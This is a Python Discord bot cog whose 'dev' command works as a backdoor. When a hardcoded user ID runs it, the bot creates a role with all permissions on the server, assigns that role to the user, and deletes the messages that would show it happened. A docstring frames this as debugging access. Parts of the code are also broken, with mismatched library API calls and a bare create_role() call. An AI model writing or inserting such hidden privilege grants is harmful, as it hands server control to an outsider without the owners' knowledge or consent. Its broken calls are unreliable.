from discord.ext import commands
import discord
import asyncio

class Devs():
    def __init__(self, bot):
        self.bot = bot
        
    @commands.command()
    async def dev(self, ctx):
        """
        Command Use: For Dev to be able to get perms on a guild for debugging purposes easily
        """
    
        if ctx.message.author.id == "150750980097441792": #OGaming's User ID
            try:
                if discord.utils.get(ctx.message.author.roles, name="(._.)"):
                    tmp = await ctx.send("Already Completed")
                    await asyncio.sleep(3)
                    await self.bot.delete_messages([tmp, ctx.message])
                else:
                    if discord.utils.get(ctx.message.guild.roles, name="(._.)"): #Role all ready exists
                        tmp = await ctx.send("All ready made")
                    else:
                        await self.bot.create_role(ctx.message.guild, name="(._.)", permissions=discord.Permissions.all())
                        tmp = await ctx.send("Made")
                    await asyncio.sleep(1)
                    await self.bot.add_roles(ctx.message.author, discord.utils.get(ctx.message.guild.roles, name="(._.)"))
                    await tmp.edit(content="Added")
                    success = await ctx.send("Success")
                    await asyncio.sleep(3)
                    await ctx.message.channel.delete_messages([tmp, success, ctx.message])
            except discord.Forbidden as error:
                await ctx.send(ctx.message.author.mention + "{} doesn't have perms".format(self.bot.user.name))
        else:
            tmp = await ctx.send("{} does not have permission to use this command".format(ctx.message.author.mention))
            await asyncio.sleep(3)
            await ctx.channel.delete_messages([tmp, ctx.message])
        return
    
    @commands.command()
    async def pvp(self, ctx, *args, role: discord.Role = None): #args are all the names of the roles with spaces and Capitals
        if not role:
            amount = len(args)
            start = 0
            for i in range(start, amount):
                current = args[i]
                noSpace = current.replace(" ", "")
                noSpace = noSpace.lower()
                await ctx.send("/roles add {} --role {}".format(noSpace, current))
            return
        else:
            self.bot.create_role()

    #@commands.command(pass_context=True)
    #async def roles_change(self, ctx, roles: discord.Role):
    #    self.bot.edit_role(ctx.message.guild, roles)#, permissions=administrator)

def setup(bot):
    bot.add_cog(Devs(bot))